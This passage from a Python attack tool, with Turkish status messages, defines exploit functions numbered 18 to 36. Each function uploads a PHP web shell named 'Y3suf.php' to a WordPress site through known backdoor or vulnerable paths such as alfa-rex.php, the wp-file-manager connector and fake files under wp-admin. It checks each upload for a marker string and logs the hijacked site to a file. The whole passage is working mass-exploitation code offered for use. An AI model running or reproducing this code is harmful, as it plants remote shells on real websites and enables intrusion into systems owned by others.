            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 17 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_18(url):
    try:
        files = {'f': ("Y3suf.php", uploaderContent)}
        data = {"a":"fm","p":"uploadFile","ch":"Windows-1251"}
        post = requests.post(url + "/alfa-rex.php7",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 18 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 18 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_19(url):
    try:
        files = {'f': ("Y3suf.php", uploaderContent)}
        data = {"a":"fm","p":"uploadFile","ch":"Windows-1251"}
        post = requests.post(url + "/alfa-rex.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 19 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 19 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_20(url):
    try:
        files = {'f': ("Y3suf.php", uploaderContent)}
        data = {"a":"fm","p":"uploadFile","ch":"Windows-1251"}
        post = requests.post(url + "/wp-admin/js/about.php7",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/wp-admin/js/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/wp-admin/js/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 20 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 20 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_21(url):
    try:
        files = {'file': ("Y3suf.php", uploaderContent)}
        data = {"submit":"upload"}
        post = requests.post(url + "/wp-content/themes/applica/400.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/wp-content/themes/applica/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/wp-content/themes/applica/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 21 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 21 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_22(url):
    try:
        files = {'upload': ("Y3suf.php", uploaderContent)}
        data = {"submit":"Upload"}
        post = requests.post(url + "/wp-content/themes/universal-news/www.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/wp-content/themes/universal-news/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/wp-content/themes/universal-news/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 22 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 22 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_23(url):
    try:
        data = {"submit":"Upload"}
        files = {"upload":("Y3suf.php",uploaderContent)}
        post = requests.post(url + "/wp-content/themes/universal-news/www.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/wp-content/themes/universal-news/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/wp-content/themes/universal-news/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 23 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 23 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_24(url):
    try:
        files = {'uploaded_file': ("Y3suf.php", uploaderContent)}
        data = {"submit":"Upload"}
        post = requests.post(url + "/wp-content/themes/database.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/wp-content/themes/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/wp-content/themes/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 24 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 24 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_25(url):
    try:
        files = {'uploaded_file': ("Y3suf.php", uploaderContent)}
        data = {"submit":"Upload"}
        post = requests.post(url + "/wp-content/database.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/wp-content/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/wp-content/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 25 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 25 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_26(url):
    try:
        files = {'uploaded_file': ("Y3suf.php", uploaderContent)}
        data = {"submit":"Upload"}
        post = requests.post(url + "/wp-content/plugins/database.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/wp-content/plugins/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/wp-content/plugins/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 26 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 26 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_27(url):
    try:
        files = {'uploaded_file': ("Y3suf.php", uploaderContent)}
        data = {"submit":"Upload"}
        post = requests.post(url + "/wp-content/themes/database.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/wp-content/themes/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/wp-content/themes/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 27 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 27 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_28(url):
    try:
        files = {'upload': ("Y3suf.php", uploaderContent)}
        data = {"submit":"Upload"}
        post = requests.post(url + "/.well-known/acme-challenge/cloud.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/.well-known/acme-challenge/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/.well-known/acme-challenge/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 28 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 28 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_29(url):
    try:
        files = {'upload[]': ("Y3suf.php", uploaderContent, 'multipart/form-data')}
        data = {'cmd': 'upload', 'target': 'l1_Lw'}
        post = requests.post(url + "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/wp-content/plugins/wp-file-manager/lib/files/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/wp-content/plugins/wp-file-manager/lib/files/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 29 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 29 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_30(url):
    try:
        files = {'gazaUP': ("Y3suf.php", uploaderContent)}
        data = {'submit':'Upload'}
        post = requests.post(url + "/wp-content/upgrade/GaZa.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/wp-content/upgrade/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/wp-content/upgrade/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 30 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 30 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_31(url):
    try:
        files = {'gazaUP': ("Y3suf.php", uploaderContent)}
        data = {'submit':'Upload'}
        post = requests.post(url + "/wp-content/upgrade/GaZa.php",headers=headers,files=files,data=data,verify=False,timeout=5)
        check = requests.get(url + "/wp-content/upgrade/Y3suf.php?y3suf=1453",headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in check.text:
            open("Uploaders.txt","a").write(url + "/wp-content/upgrade/Y3suf.php?y3suf=1453"+"\n")
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 31 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 31 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_32(url):
    try:
        data = {'password': 'yanz', 'submit': '>>', 'a': 'fm', 'p': 'uploadFile', 'ch': 'Windows-1251'}
        files = {"f":("Y3suf.php",uploaderContent)}
        path = url + "/wp-admin/css/colors/coffee/index.php"
        uploaded = url + "/wp-admin/css/colors/coffee/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 32 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 32 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_33(url):
    try:
        data = {"submit":"Upload"}
        files = {"upload":("Y3suf.php",uploaderContent)}
        path = url + "/wp-admin/js/widgets/cloud.php"
        uploaded = url + "/wp-admin/js/widgets/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 33 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 33 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_34(url):
    try:
        data = {'a':'fm','p':'uploadFile','c':'','ch':'Windows-1251'}
        files = {"f":("Y3suf.php",uploaderContent)}
        path = url + "/wp-admin/css/colors/ectoplasm/about.php"
        uploaded = url + "/wp-admin/css/colors/ectoplasm/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 34 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 34 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_35(url):
    try:
        data = {'a':'fm','p':'uploadFile','c':'','ch':'Windows-1251'}
        files = {"f":("Y3suf.php",uploaderContent)}
        path = url + "/wp-admin/css/colors/light/about.php"
        uploaded = url + "/wp-admin/css/colors/light/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 35 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 35 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
    except Exception as e:
        pass
def VULN_36(url):
    try:
        data = {'a':'fm','p':'uploadFile','c':'','ch':'Windows-1251'}
        files = {"f":("Y3suf.php",uploaderContent)}
        path = url + "/wp-admin/css/colors/sunrise/about.php"
        uploaded = url + "/wp-admin/css/colors/sunrise/Y3suf.php?y3suf=1453"
        post = requests.post(path,headers=headers,data=data,files=files,verify=False,timeout=5)
        get = requests.get(uploaded,headers=headers,verify=False,timeout=5)
        if 'M3xSploitV1' in get.text:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 36 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.GREEN+"Shell Yüklendi"+colorama.Fore.LIGHTWHITE_EX+"]")
            open("Uploaders.txt","a").write(uploaded+"\n")
        else:
            print(colorama.Fore.LIGHTWHITE_EX+" -| "+colorama.Fore.LIGHTYELLOW_EX+"Exploit 36 "+colorama.Fore.LIGHTCYAN_EX+"==> "+colorama.Fore.LIGHTWHITE_EX+url+colorama.Fore.LIGHTCYAN_EX+" ==> "+colorama.Fore.LIGHTWHITE_EX+"["+colorama.Fore.RED+"Shell Yüklenemedi"+colorama.Fore.LIGHTWHITE_EX+"]")
    except KeyboardInterrupt:
        exit(colorama.Fore.LIGHTWHITE_EX+"\n["+colorama.Fore.RED+"#"+colorama.Fore.LIGHTWHITE_EX+"] Exit ...")
